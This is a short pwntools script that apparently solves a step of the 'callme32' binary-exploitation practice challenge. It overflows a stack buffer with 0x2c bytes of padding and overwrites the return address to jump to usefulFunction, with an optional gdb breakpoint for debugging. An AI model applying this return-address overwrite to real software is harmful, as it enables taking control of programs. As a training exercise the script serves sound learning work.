#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# return to usefulfunction to obsterv orfdinary call
# break after the read in pwnme
gs='''
b *pwnme+97
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('callme32')
context.binary=elf
context(terminal=['tmux', 'split-window', '-h'])

# Offset to return address
offset=0x2c

usefulFunction=elf.symbols['usefulFunction']


io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p32(usefulFunction)

io.sendline(PL)
io.interactive()

